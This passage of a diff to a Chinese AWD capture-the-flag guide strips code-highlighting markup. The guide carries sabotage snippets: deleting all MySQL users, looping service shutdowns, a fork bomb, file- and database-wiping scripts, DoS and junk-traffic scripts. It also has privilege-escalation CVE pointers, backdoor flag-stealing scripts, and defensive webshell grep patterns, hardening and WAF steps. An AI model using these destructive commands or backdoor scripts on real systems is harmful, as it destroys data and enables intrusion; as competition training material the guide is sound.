       file_get_contents(&quot;http://127.0.0.1/&quot;);
   }
-?&gt;</span>
+?&gt;
 </code></pre><p>&#x4FEE;&#x6539;&#x6570;&#x636E;&#x5E93;&#x5BC6;&#x7801;</p>
-<pre class="language-"><code>update mysql.user set authentication_string=PASSWORD(&apos;p4rr0t&apos;);# &#x4FEE;&#x6539;&#x6240;&#x6709;&#x7528;&#x6237;&#x5BC6;&#x7801;
+<pre><code>update mysql.user set authentication_string=PASSWORD(&apos;p4rr0t&apos;);# &#x4FEE;&#x6539;&#x6240;&#x6709;&#x7528;&#x6237;&#x5BC6;&#x7801;
 flush privileges;
 UPDATE mysql.user SET User=&apos;aaaaaaaaaaaa&apos; WHERE user=&apos;root&apos;; 
 flush privileges;
 delete from mysql.user ;#&#x5220;&#x9664;&#x6240;&#x6709;&#x7528;&#x6237;
 flush privileges;
 </code></pre><p>&#x91CD;&#x542F; apache2 &#x548C; nigix</p>
-<pre class="language-"><code>#!/usr/bin/env sh
+<pre><code>#!/usr/bin/env sh
 while [[ 1 ]]
 do
     service apache2 stop
     service nginx stop
 done &amp;
 </code></pre><p>&#x5FAA;&#x73AF;&#x5220;&#x9664;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
+<pre><code>&lt;?php
     set_time_limit(0);
     ignore_user_abort(1);
     unlink(__FILE__);
@@ -3704,15 +3700,15 @@ done &amp;
         getfiles(__DIR__);
         sleep(10);
     }
-?&gt;</span>
+?&gt;
 
-<span class="token prolog">&lt;?php
+&lt;?php
     set_time_limit(0);
     ignore_user_abort(1);
     array_map(&apos;unlink&apos;, glob(&quot;some/dir/*.php&quot;));
-?&gt;</span>
+?&gt;
 </code></pre><p>&#x5220;&#x9664;&#x6570;&#x636E;&#x5E93;</p>
-<pre class="language-"><code>#!/usr/bin/env python3
+<pre><code>#!/usr/bin/env python3
   import base64
   def rm_db(db_user,my_db_passwd):
       cmd = &quot;/usr/bin/mysql -h localhost -u%s %s -e &apos;&quot;%(db_user,my_db_passwd)
@@ -3722,10 +3718,10 @@ done &amp;
       cmd += &quot;&apos;&quot;
       return cmd
 </code></pre><p>fork_bomb</p>
-<pre class="language-"><code>#!/bin/sh
+<pre><code>#!/bin/sh
 /bin/echo &apos;.() { .|.&amp; } &amp;&amp; .&apos; &gt; /tmp/aaa;/bin/bash /tmp/aaa;
 </code></pre><p>DOS&#x811A;&#x672C;&#xFF08;&#x975E;&#x5FC5;&#x8981;&#x6700;&#x597D;&#x4E0D;&#x8981;&#x7528;&#xFF09;</p>
-<pre class="language-"><code>import socket
+<pre><code>import socket
 import time
 import threading
 
@@ -3771,18 +3767,18 @@ Two.start()
 </code></pre><h1 id="&#x9632;&#x5B88;&#x601D;&#x8DEF;">&#x9632;&#x5B88;&#x601D;&#x8DEF;</h1>
 <h2 id="&#x57FA;&#x7840;&#x67E5;&#x6740;">&#x57FA;&#x7840;&#x67E5;&#x6740;</h2>
 <p>&#x5BFB;&#x627E;&#x6700;&#x8FD1;20&#x5206;&#x949F;&#x4FEE;&#x6539;&#x8FC7;&#x7684;&#x6587;&#x4EF6;</p>
-<pre class="language-"><code>find /var/www/html -name *.php -mmin -20
+<pre><code>find /var/www/html -name *.php -mmin -20
 </code></pre><p>&#x5BFB;&#x627E;&#x884C;&#x6570;&#x6700;&#x77ED;&#x7684;&#x6587;&#x4EF6;&#xFF1A;</p>
-<pre class="language-"><code>find ./ -name &apos;*.php&apos; | xargs wc -l | sort -u
+<pre><code>find ./ -name &apos;*.php&apos; | xargs wc -l | sort -u
 </code></pre><p>&#x5173;&#x952E;&#x5B57;&#x67E5;&#x6740;</p>
-<pre class="language-"><code>find . -name &apos;*.php&apos; | xargs grep -n &apos;eval(&apos;
+<pre><code>find . -name &apos;*.php&apos; | xargs grep -n &apos;eval(&apos;
 find . -name &apos;*.php&apos; | xargs grep -n &apos;assert&apos;
 find . -name &apos;*.php&apos; | xargs grep -n &apos;system()&apos;
 </code></pre><p>&#x67E5;&#x627E;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x51FD;&#x6570;</p>
-<pre class="language-"><code>find /var/www/html -name &quot;*.php&quot; |xargs egrep &apos;assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\(&apos;
+<pre><code>find /var/www/html -name &quot;*.php&quot; |xargs egrep &apos;assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\(&apos;
 </code></pre><h2 id="&#x6587;&#x4EF6;&#x76D1;&#x63A7;">&#x6587;&#x4EF6;&#x76D1;&#x63A7;</h2>
 <p>&#x811A;&#x672C;</p>
-<pre class="language-"><code># -*- coding: utf-8 -*-
+<pre><code># -*- coding: utf-8 -*-
 #use: python file_check.py ./
 
 import os
@@ -3957,21 +3953,21 @@ if __name__ == &apos;__main__&apos;:
         time.sleep(2)
         # print &apos;[*] &apos; + getUnicode(time.ctime())
 </code></pre><p>&#x8FD0;&#x884C;</p>
-<pre class="language-"><code>python jiankong.py  /var/www/html
+<pre><code>python jiankong.py  /var/www/html
 </code></pre><h2 id="alias&#x8D77;&#x522B;&#x540D;">alias&#x8D77;&#x522B;&#x540D;</h2>
-<pre class="language-"><code>alias cat=&quot;echo nothing&quot;
+<pre><code>alias cat=&quot;echo nothing&quot;
 </code></pre><p>&#x5220;&#x9664;</p>
-<pre class="language-"><code>unalias -a
+<pre><code>unalias -a
 </code></pre><p>&#x5BF9;&#x65B9;&#x6267;&#x884C;cat /flag&#x547D;&#x4EE4;&#x7684;&#x65F6;&#x5019;&#x56DE;&#x663E;&#x5C31;&#x662F;&#x9519;&#x8BEF;flag</p>
-<pre class="language-"><code>alias cat=&quot;echo `date`|md5sum|cut -d &apos; &apos; -f1||&quot;
+<pre><code>alias cat=&quot;echo `date`|md5sum|cut -d &apos; &apos; -f1||&quot;
 </code></pre><p>&#x83B7;&#x53D6; flag &#x4E00;&#x822C;&#x662F; curl <a href="http://xxx.com/flag.txt" target="_blank">http://xxx.com/flag.txt</a></p>
-<pre class="language-"><code>alias curl=&apos;echo fuckoff&apos; #&#x6743;&#x9650;&#x8981;&#x6C42;&#x8F83;&#x4F4E;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x8FD9;&#x91CC;&#x6539;&#x6210;&#x865A;&#x5047;&#x7684;flag
+<pre><code>alias curl=&apos;echo fuckoff&apos; #&#x6743;&#x9650;&#x8981;&#x6C42;&#x8F83;&#x4F4E;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x8FD9;&#x91CC;&#x6539;&#x6210;&#x865A;&#x5047;&#x7684;flag
 # &#x6216;&#x8005;
 chmod -x curl #&#x6743;&#x9650;&#x8981;&#x6C42;&#x8F83;&#x9AD8;
 /usr/bin curl&#x8DEF;&#x5F84;
 </code></pre><h2 id="&#x6740;&#x4E0D;&#x6B7B;&#x9A6C;">&#x6740;&#x4E0D;&#x6B7B;&#x9A6C;</h2>
 <p>&#x67E5;&#x770B;&#x8FDB;&#x7A0B;</p>
-<pre class="language-"><code>root@1177499f5b23:~# ps aux | grep www-data
+<pre><code>root@1177499f5b23:~# ps aux | grep www-data
 www-data  4819  0.0  0.4 315808  9016 ?        S    Dec16   0:00 apache2 -D FOREGROUND
 www-data  6663  0.0  0.6 316188 13460 ?        S    Dec16   0:00 apache2 -D FOREGROUND
 www-data  6675  0.0  0.3 315620  6976 ?        S    Dec16   0:00 apache2 -D FOREGROUND
@@ -3984,12 +3980,12 @@ www-data  8380  0.0  0.6 316188 12612 ?        S    Dec16   0:00 apache2 -D FORE
 www-data 22554  0.0  0.3 315564  7416 ?        S    03:10   0:00 apache2 -D FOREGROUND
 root     25353  0.0  0.0   8868  1544 pts/1    S+   05:25   0:00 grep --color=auto www-data
 </code></pre><p>(1)&#x6740;&#x8FDB;&#x7A0B;</p>
-<pre class="language-"><code>kill -9 &#x5BF9;&#x5E94;&#x7684;&#x8FDB;&#x7A0B;&#x53F7;
+<pre><code>kill -9 &#x5BF9;&#x5E94;&#x7684;&#x8FDB;&#x7A0B;&#x53F7;
 </code></pre><p>&#x6267;&#x884C;&#x547D;&#x4EE4;</p>
-<pre class="language-"><code>ps aux | grep www-data | awk &apos;{print $2}&apos; | xargs kill -9
+<pre><code>ps aux | grep www-data | awk &apos;{print $2}&apos; | xargs kill -9
 ps aux | grep www-data | grep -v grep | awk &apos;{print $2}&apos; | xargs kill -9
 </code></pre><p>&#x539F;&#x7406;</p>
-<pre class="language-"><code>ps aux
+<pre><code>ps aux
 &#x5217;&#x51FA;&#x8FDB;&#x7A0B;&#x4FE1;&#x606F;
 
 grep www-data
@@ -4005,17 +4001,17 @@ xargs kill -9
 &#x5C06;&#x8FDB;&#x7A0B;&#x53F7;&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#x4F20;&#x9012;&#x7ED9;kill -9&#x8FD9;&#x4E2A;&#x547D;&#x4EE4;
 </code></pre><p>&#x7136;&#x540E;&#x5220;&#x9664;&#x4E0D;&#x6B7B;&#x9A6C;&#x6587;&#x4EF6;</p>
 <p>(2)&#x91CD;&#x542F;php&#x7B49;web&#x670D;&#x52A1;&#xFF0C;&#x4E0D;&#x63A8;&#x8350;&#x4F7F;&#x7528;</p>
-<pre class="language-"><code>service php-fpm restart
+<pre><code>service php-fpm restart
 </code></pre><p>(3)&#x7528;&#x4E00;&#x4E2A;ignore_user_abort(true)&#x811A;&#x672C;&#xFF0C;&#x4E00;&#x76F4;&#x7ADE;&#x4E89;&#x5199;&#x5165;&#xFF08;&#x65AD;&#x65AD;&#x7EED;&#x7EED;&#xFF09;&#x3002;usleep&#x8981;&#x4F4E;&#x4E8E;&#x5BF9;&#x65B9;&#x4E0D;&#x6B7B;&#x9A6C;&#x8BBE;&#x7F6E;&#x7684;&#x503C;&#x3002;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
+<pre><code>&lt;?php
 while (1) {
     $pid=1234;  #&#x4E0D;&#x6B7B;&#x9A6C;&#x8FDB;&#x7A0B;
     @unlink(&apos;demo.php&apos;);
     exec(&apos;kill -9 $pid&apos;);
 }
-?&gt;</span>
+?&gt;
 
-<span class="token prolog">&lt;?php
+&lt;?php
     ignore_user_abort(true);
     set_time_limit(0);
     unlink(__FILE__);
@@ -4028,10 +4024,10 @@ while (1) {
     //    usleep(5000);
           usleep(1000);
     }
-?&gt;</span>
+?&gt;
 </code></pre><p>(4)&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x548C;&#x4E0D;&#x6B7B;&#x9A6C;&#x751F;&#x6210;&#x7684;&#x9A6C;&#x4E00;&#x6837;&#x540D;&#x5B57;&#x7684;&#x6587;&#x4EF6;&#x5939; mkdir 1.php
 &#x5FAA;&#x73AF;&#x521B;&#x5EFA;</p>
-<pre class="language-"><code>#!/bin/bash
+<pre><code>#!/bin/bash
 dire=&quot;/var/www/html/.base.php/&quot;
 file=&quot;/var/www/html/.base.php&quot;
 rm -rf $file
@@ -4039,15 +4035,15 @@ mkdir $dire
 ./xx.sh
 </code></pre><h2 id="&#x6E05;&#x9664;&#x53CD;&#x5F39;shell">&#x6E05;&#x9664;&#x53CD;&#x5F39;shell</h2>
 <p>&#x67E5;&#x770B;&#x8FDB;&#x7A0B;</p>
-<pre class="language-"><code>ps -ef / px -aux
+<pre><code>ps -ef / px -aux
 </code></pre><p>&#x51FA;&#x73B0;www-data&#x6743;&#x9650;&#x7684;/bin/sh&#x4E00;&#x822C;&#x4E3A;nc</p>
 <p>&#x7136;&#x540E;&#x6740;&#x8FDB;&#x7A0B;</p>
-<pre class="language-"><code>kill `ps -aux | grep www-data | grep apache2 | awk &apos;{print $2}&apos;`
+<pre><code>kill `ps -aux | grep www-data | grep apache2 | awk &apos;{print $2}&apos;`
 </code></pre><h2 id="&#x63D0;&#x6743;">&#x63D0;&#x6743;</h2>
 <p>&#x5728;AWD&#x4E2D;&#xFF0C;&#x4E00;&#x822C;&#x90FD;&#x9700;&#x8981;&#x4E13;&#x95E8;&#x9632;&#x5FA1;&#x52A0;&#x56FA;&#x81EA;&#x5DF1;&#x670D;&#x52A1;&#x5668;&#x7684;&#x73AF;&#x8282;&#xFF0C;&#x4F46;&#x52A0;&#x56FA;&#x7684;&#x5F88;&#x591A;&#x64CD;&#x4F5C;&#x90FD;&#x4F1A;&#x6D89;&#x53CA;&#x5230;root&#x6743;&#x9650;&#xFF0C;&#x5982;&#x679C;&#x76F4;&#x63A5;&#x7ED9;root&#x6743;&#x9650;&#x6700;&#x597D;&#xFF0C;&#x4F46;&#x4E00;&#x822C;&#x53EA;&#x4F1A;&#x7ED9;&#x4E00;&#x4E2A;&#x666E;&#x901A;&#x6743;&#x9650;&#x8D26;&#x53F7;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x5F80;&#x5F80;&#x5C31;&#x9700;&#x8981;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x63D0;&#x6743;&#x4E86;&#x3002;</p>
 <p>&#x5173;&#x4E8E;&#x63D0;&#x6743;&#xFF0C;&#x901A;&#x5E38;&#x6211;&#x4EEC;&#x8981;&#x6839;&#x636E;kernel&#x7248;&#x672C;&#x53F7;&#x627E;&#x5230;&#x5BF9;&#x5E94;&#x7684;poc&#xFF0C;&#x5E73;&#x65F6;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6536;&#x96C6;&#x6D4B;&#x8BD5;&#x4E00;&#x4E9B;&#x6BD4;&#x8F83;&#x65B0;&#x7684;&#x63D0;&#x6743;poc&#xFF0C;&#x4EE5;&#x5907;&#x4E0D;&#x65F6;&#x4E4B;&#x9700;&#x3002;</p>
 <p>&#x5F71;&#x54CD;&#x8303;&#x56F4;&#x6BD4;&#x8F83;&#x5927;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x63D0;&#x6743;&#xFF1A;</p>
-<pre class="language-"><code>CVE-2017-6074 (DCCP&#x53CC;&#x91CD;&#x91CA;&#x653E;&#x6F0F;&#x6D1E; &gt; 2.6.18 ) &#xFF1A;
+<pre><code>CVE-2017-6074 (DCCP&#x53CC;&#x91CD;&#x91CA;&#x653E;&#x6F0F;&#x6D1E; &gt; 2.6.18 ) &#xFF1A;
 DCCP&#x53CC;&#x91CD;&#x91CA;&#x653E;&#x6F0F;&#x6D1E;&#x53EF;&#x5141;&#x8BB8;&#x672C;&#x5730;&#x4F4E;&#x6743;&#x9650;&#x7528;&#x6237;&#x4FEE;&#x6539;Linux&#x5185;&#x6838;&#x5185;&#x5B58;&#xFF0C;&#x5BFC;&#x81F4;&#x62D2;&#x7EDD;&#x670D;&#x52A1;(&#x7CFB;&#x7EDF;&#x5D29;&#x6E83;)&#x6216;&#x8005;&#x63D0;&#x5347;&#x6743;&#x9650;&#xFF0C;&#x83B7;&#x5F97;&#x7CFB;&#x7EDF;&#x7684;&#x7BA1;&#x7406;&#x8BBF;&#x95EE;&#x6743;&#x9650;
 
 CVE-2016-5195(&#x810F;&#x725B;&#xFF0C;kernel 2.6.22 &lt; 3.9 (x86/x64)) &#xFF1A;
@@ -4078,27 +4074,27 @@ POC&#xFF1A;https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CV
 <li>&#x5BF9;&#x4E8E;&#x89C9;&#x5F97;&#x5371;&#x9669;&#x51FD;&#x6570;&#x7684;&#x5730;&#x65B9;&#x76F4;&#x63A5;&#x4F7F;&#x7528;die()&#xFF1B;</li>
 </ul>
 <p>&#x6BD4;&#x5982;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;upload&#x76EE;&#x5F55;&#x4E0B;&#x5199;.htaccess&#x7981;&#x6B62;php&#x6587;&#x4EF6;&#x6267;&#x884C;</p>
-<pre class="language-"><code>&lt;Directory &quot;/var/www/html/upload&quot;&gt;
+<pre><code>&lt;Directory &quot;/var/www/html/upload&quot;&gt;
 Options -ExecCGI -Indexes
 AllowOverride None
 RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml
 RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml
 php_flag engine off
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FilesMatch</span> <span class="token attr-name">&quot;.+\.ph(p[3457]?|t|tml)$&quot;</span><span class="token punctuation">&gt;</span></span>
+&lt;FilesMatch &quot;.+\.ph(p[3457]?|t|tml)$&quot;&gt;
 deny from all
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FilesMatch</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Directory</span><span class="token punctuation">&gt;</span></span>
+&lt;/FilesMatch&gt;
+&lt;/Directory&gt;
 </code></pre><p>&#x4E00;&#x4E9B;&#x4FEE;&#x590D;&#x6280;&#x5DE7;&#x53C2;&#x8003;&#xFF1A;<a href="https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/" target="_blank">https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/</a></p>
 <h2 id="&#x65E5;&#x5FD7;&#x5206;&#x6790;">&#x65E5;&#x5FD7;&#x5206;&#x6790;</h2>
 <p>&#x547D;&#x4EE4;&#x884C;&#x52A8;&#x6001;&#x67E5;&#x770B;&#x65E5;&#x5FD7;</p>
-<pre class="language-"><code>tailf /var/log/apache2/access.log
+<pre><code>tailf /var/log/apache2/access.log
 </code></pre><p>&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5DE5;&#x5177;&#x8FDB;&#x884C;&#x65E5;&#x5FD7;&#x5206;&#x6790;&#xFF1A;<a href="https://security.tencent.com/index.php/opensource/detail/15" target="_blank">LogForensics &#x817E;&#x8BAF;&#x5B9E;&#x9A8C;&#x5BA4; /web&#x65E5;&#x5FD7;&#x53D6;&#x8BC1;&#x5206;&#x6790;&#x5DE5;&#x5177;</a></p>
 <p>&#x65E5;&#x5FD7;&#x7684;&#x5B58;&#x653E;&#x5730;&#x5740;</p>
-<pre class="language-"><code>/var/log/apache2/
+<pre><code>/var/log/apache2/
 /usr/local/apache2/logs
 /usr/nginx/logs/
 </code></pre><p>&#x4E3A;&#x4E86;&#x5BF9;&#x5176;&#x4ED6;&#x9632;&#x5B88;&#x65B9;&#x8FDB;&#x884C;&#x5E72;&#x6270;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x811A;&#x672C;&#x53D1;&#x751F;&#x5927;&#x91CF;&#x5783;&#x573E;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x6DF7;&#x6DC6;&#x89C6;&#x89C9;&#xFF0C;&#x7ED9;&#x5BF9;&#x65B9;&#x4EBA;&#x5458;&#x589E;&#x52A0;&#x68C0;&#x6D4B;&#x7684;&#x96BE;&#x5EA6;&#xFF0C;&#x6D6A;&#x8D39;&#x5BF9;&#x65B9;&#x7684;&#x65F6;&#x95F4;&#x3002;</p>
-<pre class="language-"><code>import requests
+<pre><code>import requests
 import time
 
 def scan_attack():
@@ -4126,7 +4122,7 @@ if __name__ == &apos;__main__&apos;:
     scan_attack()
 </code></pre><h2 id="&#x6D41;&#x91CF;&#x5206;&#x6790;">&#x6D41;&#x91CF;&#x5206;&#x6790;</h2>
 <p>&#x5728;&#x6BD4;&#x8D5B;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x6293;&#x53D6;&#x6D41;&#x91CF;&#x5305;&#xFF0C;&#x9700;&#x8981;&#x7684;&#x6743;&#x9650;&#x6BD4;&#x8F83;&#x9AD8;&#xFF0C;&#x4E00;&#x822C;&#x6BD4;&#x8D5B;&#x7528;&#x4E0D;&#x5230;</p>
-<pre class="language-"><code>sudo tcpdump -s 0 -w flow.pcap port 80
+<pre><code>sudo tcpdump -s 0 -w flow.pcap port 80
 # &#x7136;&#x540E;&#x4F7F;&#x7528; scp &#x5199;&#x4E2A;&#x811A;&#x672C;&#x5B9E;&#x65F6;&#x5C06;&#x6D41;&#x91CF;&#x5305;&#x62F7;&#x8D1D;&#x5230;&#x672C;&#x5730;
 
 
@@ -4141,7 +4137,7 @@ tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 
 7&#x3001;src net 192.168.1.0/24 : &#x6570;&#x636E;&#x5305;&#x7684;&#x6E90;&#x7F51;&#x7EDC;&#x5730;&#x5740;&#x4E3A;192.168.1.0/24
 8&#x3001;-w ./target.cap : &#x4FDD;&#x5B58;&#x6210;cap&#x6587;&#x4EF6;&#xFF0C;&#x65B9;&#x4FBF;&#x7528;wireshark&#x5206;&#x6790;
 </code></pre><p>PHP&#x7248;&#x6D41;&#x91CF;&#x76D1;&#x63A7;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
+<pre><code>&lt;?php
 
   date_default_timezone_set(&apos;Asia/Shanghai&apos;);
 
@@ -4163,10 +4159,10 @@ fwrite($fh, $logadd);
 
 fclose($fh);
 
-?&gt;</span>
+?&gt;
 </code></pre><p>&#x4E00;&#x4E2A;&#x9488;&#x5BF9;php&#x7684;web&#x6D41;&#x91CF;&#x6293;&#x53D6;&#x3001;&#x5206;&#x6790;&#x7684;&#x5E94;&#x7528;&#xFF1A;<a href="https://github.com/wupco" target="_blank">wupco</a>/<a href="https://github.com/wupco/weblogger" target="_blank">weblogger</a>
 &#x4F7F;&#x7528;&#x65B9;&#x6CD5;</p>
-<pre class="language-"><code>cd /var/www/html/ (or other web dir)
+<pre><code>cd /var/www/html/ (or other web dir)
 
    git clone https://github.com/wupco/weblogger.git
 
@@ -4188,7 +4184,7 @@ fclose($fh);
 &#x9879;&#x76EE;&#x5730;&#x5740;&#xFF1A;<a href="https://github.com/NonupleBroken/AWD_PHP_WAF" target="_blank">https://github.com/NonupleBroken/AWD_PHP_WAF</a></p>
 <p>&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#xFF1A;
 &#x4F7F;&#x7528;&#x524D;&#x5148;&#x4FEE;&#x6539;config.php&#x5185;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x5BC6;&#x7801;&#x4F7F;&#x7528;sha256&#x52A0;&#x5BC6;</p>
-<pre class="language-"><code>&#x4E0A;waf&#xFF1A;
+<pre><code>&#x4E0A;waf&#xFF1A;
 $ find . -path ./waffffff -prune -o -type f -name &quot;*.php&quot; -print | xargs sed -i &quot;s/&lt;?php/&lt;?php include_once(\&quot;\/var\/www\/html\/waffffff\/waf.php\&quot;);/g&quot;
 
 &#x4E0B;waf&#xFF1A;
@@ -4200,7 +4196,7 @@ $ find . -path ./waffffff -prune -o -type f -name &quot;*.php&quot; -print | xar
 &#x8FD9;&#x662F;&#x4E2A;&#x901A;&#x9632;waf&#xFF0C;&#x652F;&#x6301;&#x6D41;&#x91CF;&#x8F6C;&#x53D1;&#x548C;&#x66FF;&#x6362;flag
 &#x9879;&#x76EE;&#x5730;&#x5740;&#xFF1A;<a href="https://github.com/leohearts/awd-watchbird" target="_blank">https://github.com/leohearts/awd-watchbird</a></p>
 <p>1.&#x6253;&#x5305;&#x597D;&#x597D;&#x4E4B;&#x540E;&#x76F4;&#x63A5;&#x4E0A;&#x4F20;&#x5230;html&#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x56DE;&#x5230;&#x7EC8;&#x7AEF;&#xFF0C;&#x5728;&#x4E0A;&#x4F20;&#x7684;waf&#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x4F7F;&#x7528;&#x547D;&#x4EE4;</p>
-<pre class="language-"><code>php watchbird.php --install /var/www/html
+<pre><code>php watchbird.php --install /var/www/html
 </code></pre><p>&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x4F7F;&#x6BCF;&#x4E2A;&#x9875;&#x9762;&#x7684;php&#x4EE3;&#x7801;&#x5305;&#x542B;&#x5230;waf&#x4E0B;</p>
 <p>2.&#x8FD0;&#x884C;waf &#x4E4B;&#x540E;&#xFF0C;&#x6253;&#x5F00;&#x6211;&#x4EEC;&#x7684;web &#x9875;&#x9762;&#xFF0C;&#x5728;&#x4EFB;&#x610F;&#x4E00;&#x4E2A;php &#x9875;&#x9762;&#x540E;&#x9762;&#x8F93;&#x5165;?watchbird=ui&#xFF0C;&#x5C31;&#x4F1A;&#x8FDB;&#x5165;&#x5230;waf &#x914D;&#x7F6E;&#x9875;&#x9762;&#x7136;&#x540E;&#x8BBE;&#x7F6E;&#x5BC6;&#x7801;(&#x6CE8;&#x610F;&#xFF1A;&#x7B2C;&#x4E00;&#x6B21;&#x6253;&#x5F00;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x5BC6;&#x7801;)</p>
 <p>3.&#x914D;&#x7F6E;&#x597D;&#x4E4B;&#x540E;&#x5C31;&#x80FD;&#x8FDB;&#x5165;&#x5185;&#x90E8;&#x7F51;&#x9875;</p>
@@ -4213,14 +4209,14 @@ $ find . -path ./waffffff -prune -o -type f -name &quot;*.php&quot; -print | xar
 <p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x524D;&#x671F;&#x641C;&#x5BFB;&#x5230;&#x7684;&#x540E;&#x95E8;&#xFF0C;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x3002;&#x8FD9;&#x91CC;&#x76F4;&#x63A5;&#x7528;linux&#x7684;&#x9632;&#x706B;&#x5899;&#x8FDB;&#x884C;&#x5173;&#x95ED;&#x5373;&#x53EF;&#x3002;</p>
 <p>&#x5728;&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF1A;&#x8FD9;&#x6837;&#x7684;&#x8BDD;&#x5C31;&#x76F4;&#x63A5;&#x628A;&#x7CFB;&#x7EDF;&#x7684;&#x540E;&#x95E8;&#x5168;&#x6740;&#x6389;&#x4E86;&#x3002;&#x53EA;&#x5141;&#x8BB8;22 80 21&#x7AEF;&#x53E3;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x8BBF;&#x95EE;&#x3002;</p>
 <p>&#x9996;&#x5148;&#x5F00;&#x542F; 22 80 21</p>
-<pre class="language-"><code>iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+<pre><code>iptables -A INPUT -p tcp --dport 80 -j ACCEPT
 iptables -A INPUT -p tcp --dport 22 -j ACCEPT
 iptables -A INPUT -p tcp --dport 21 -j ACCEPT
 </code></pre><p>&#x7136;&#x540E;&#x5173;&#x95ED;</p>
-<pre class="language-"><code>iptables -A INPUT -j DROP
+<pre><code>iptables -A INPUT -j DROP
 </code></pre><p>&#x5728;&#x624B;&#x52A8;&#x4E00;&#x4E2A;&#x4E2A;&#x8FDE;shell&#x6405;shi&#x7684;&#x8BDD;&#xFF0C;&#x662F;&#x975E;&#x5E38;&#x6162;&#x7684;&#x3002;&#x4E8E;&#x662F;&#x5199;&#x4E86;&#x4E2A;&#x5C0F;&#x811A;&#x672C;&#x3002;</p>
 <p>&#x904D;&#x5386;&#x6574;&#x4E2A;IP&#x6BB5;&#xFF0C;&#x5E76;&#x5C06;&#x9632;&#x706B;&#x5899;&#x5F00;&#x542F;&#x5168;&#x90E8;&#x5C4F;&#x853D;&#x6389;~~</p>
-<pre class="language-"><code>import requests
+<pre><code>import requests
 url = &quot;http://192.168.182&quot;
 port=&apos;80&apos;
 shell = &quot;/shell.php&quot;
@@ -4240,7 +4236,7 @@ for i in range(1,254):
 <p>&#x4EE5;&#x4E0B;&#x811A;&#x672C;&#x6765;&#x81EA;&#x4E8E;&#x6211;&#x6BD4;&#x8D5B;&#x65F6;&#x5199;&#x7684;&#x5783;&#x573E;&#x811A;&#x672C;&#xFF0C;&#x5927;&#x4F6C;&#x52FF;&#x55B7;&#x3002;</p>
 <h3 id="1&#x5229;&#x7528;&#x540E;&#x95E8;getflag">1.&#x5229;&#x7528;&#x540E;&#x95E8;getflag</h3>
 <p>&#x5355;&#x4E2A;shell&#x83B7;&#x53D6;flag</p>
-<pre class="language-"><code>import requests
+<pre><code>import requests
 
 url=&quot;http://192.168.182.130/include/shell.php&quot;
 passwd=&quot;admin_ccmd&quot;
@@ -4249,7 +4245,7 @@ res=requests.post(url,payload)
 print(res.text)
 </code></pre><h3 id="2&#x540E;&#x95E8;&#x6279;&#x91CF;getflag">2.&#x540E;&#x95E8;&#x6279;&#x91CF;getflag</h3>
 <p>&#x9488;&#x5BF9;&#x7AEF;&#x53E3;&#x53D8;&#x5316;&#x5229;&#x7528;&#x540E;&#x95E8;&#x6279;&#x91CF;&#x83B7;&#x53D6;flag</p>
-<pre class="language-"><code>import requests
+<pre><code>import requests
 
 url1=&quot;http://192.168.182.130:&quot;
 url2=&quot;&quot;
@@ -4279,7 +4275,7 @@ for url2 in range(8801,8805):
         pass
 </code></pre><h3 id="3&#x5229;&#x7528;&#x540E;&#x95E8;&#x6279;&#x91CF;getflag&#x5E76;&#x63D0;&#x4EA4;">3.&#x5229;&#x7528;&#x540E;&#x95E8;&#x6279;&#x91CF;getflag&#x5E76;&#x63D0;&#x4EA4;</h3>
 <p>burp&#x6293;&#x5305;&#xFF0C;&#x53D1;&#x73B0;flag&#x4EE5;json&#x5F62;&#x5F0F;&#x4F20;&#x8F93;</p>
-<pre class="language-"><code>POST /api/flag HTTP/1.1
+<pre><code>POST /api/flag HTTP/1.1
 Host: 192.168.182.130:39999
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
 Accept: application/json, text/plain, */*
@@ -4294,7 +4290,7 @@ Referer: http://192.168.182.130:39999/
 
 {&quot;flag&quot;:&quot;SL{7a2ecc20361b7a104798b6bba6222b3972e114a2}&quot;}
